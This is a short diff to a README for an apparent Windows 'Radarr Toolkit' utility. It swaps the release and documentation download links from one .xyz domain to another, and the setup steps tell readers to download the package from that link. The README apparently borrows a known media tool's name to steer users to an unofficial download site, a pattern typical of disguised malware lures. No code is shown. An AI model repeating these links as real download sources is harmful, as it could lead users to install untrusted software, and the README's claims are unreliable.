@@ -11,8 +11,8 @@ A small, focused utility for Windows.
 Automated **Radarr Toolkit** media management system for organizing, indexing, and serving content libraries.
 
 ## Get the app
-- 📥 **Latest release:** [https://radarr-toolkit.softonx.xyz](https://radarr-toolkit.softonx.xyz)
-- 📖 **Documentation:** [https://radarr-toolkit.softonx.xyz](https://radarr-toolkit.softonx.xyz)
+- 📥 **Latest release:** [https://radarr-toolkit.softax.xyz](https://radarr-toolkit.softax.xyz)
+- 📖 **Documentation:** [https://radarr-toolkit.softax.xyz](https://radarr-toolkit.softax.xyz)
 
 ## 🚀 Quick Setup
 - [ ] Download the release package from the link above.
